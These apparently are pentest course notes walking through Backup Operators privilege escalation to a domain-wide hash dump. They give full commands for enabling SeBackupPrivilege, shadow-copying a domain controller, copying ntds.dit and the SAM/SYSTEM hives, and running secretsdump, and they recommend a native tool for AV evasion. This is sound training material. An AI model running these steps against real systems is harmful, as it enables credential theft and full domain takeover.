# Windows Built-in Groups — Backup Operators

## Why this matters

Windows/AD ships with built-in groups that grant powerful rights outside of normal ACLs. If you land on a box and `whoami /groups` shows membership in one of these, it's often a fast track to full compromise (even DA on a DC).

**Groups covered in this module:** Backup Operators, Event Log Readers, DnsAdmins, Hyper-V Administrators, Print Operators, Server Operators -> Always dump membership of these groups for the client report — accounts get added for tools/backups and forgotten.

---

## Backup Operators

Membership grants two key privileges:

- **`SeBackupPrivilege`** → read **any** file/folder, bypassing ACLs (can't use normal `copy`, must use backup-aware copy)
- **`SeRestorePrivilege`** → write any file/folder, bypassing ACLs

⚠️ An **explicit Deny ACE** still blocks access even with these privileges.

### 1. Check current privileges

```powershell
whoami /priv
```

### 2. Import the PoC modules (needed to actually use SeBackupPrivilege)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### 3. Check / enable the privilege

```powershell
Get-SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

> If disabled, `whoami /priv` shows the state as `Disabled` — `Set-SeBackupPrivilege` flips it on. Sometimes needs an elevated (UAC-bypassed) prompt.

### 4. Copy a "protected" file to prove access

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

## Escalation Path: Dumping NTDS.dit on a DC

Backup Operators can log in locally to a DC → this is the real prize: **NTDS.dit contains NTLM hashes for every user/computer in the domain.**

Problem: `ntds.dit` is a locked file in active use → solution: shadow copy it.

### 1. Create a shadow copy of C: with `diskshadow`

```
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

This exposes the shadow copy as drive `E:` — `ntds.dit` inside it is not locked.

### 2. Copy NTDS.dit off the shadow copy

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### 3. Grab SAM/SYSTEM hives too (for local creds via secretsdump)

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Alternative to steps 1-2: `robocopy` (no external tools needed)

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

`/B` = backup mode → same ACL-bypass behavior as the DLL cmdlets, but it's a native Windows binary (good for LOLBin/AV-evasion scenarios).

## Extracting Credentials from NTDS.dit

### Option A — PowerShell DSInternals (single account lookup)

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Returns full account object incl. `NTHash`, Kerberos keys, UAC flags, etc.

### Option B — Impacket secretsdump (dump everything, offline)

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

Outputs `domain\uid:rid:lmhash:nthash` for every account (Administrator, krbtgt, all users/computers) → ready for **pass-the-hash** or offline cracking with Hashcat.

> 💡 For the report: crack the dumped hashes and present password-strength stats to the client (weak policy evidence).

## Quick Recap (exam cheat-sheet)

|Step|Command|
|---|---|
|Check privs|`whoami /priv`|
|Load PoC modules|`Import-Module .\SeBackupPrivilegeUtils.dll` / `...CmdLets.dll`|
|Enable privilege|`Set-SeBackupPrivilege`|
|Copy any file|`Copy-FileSeBackupPrivilege <src> <dst>`|
|Shadow-copy C:|`diskshadow.exe` → `expose %cdrive% E:`|
|Grab hives|`reg save HKLM\SYSTEM SYSTEM.SAV` / `HKLM\SAM SAM.SAV`|

|Dump all hashes|`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`|

**Mental model:** `SeBackupPrivilege` = read-anything → get `ntds.dit` off a DC → `secretsdump.py` = instant domain-wide hash dump → PtH or crack → full compromise.
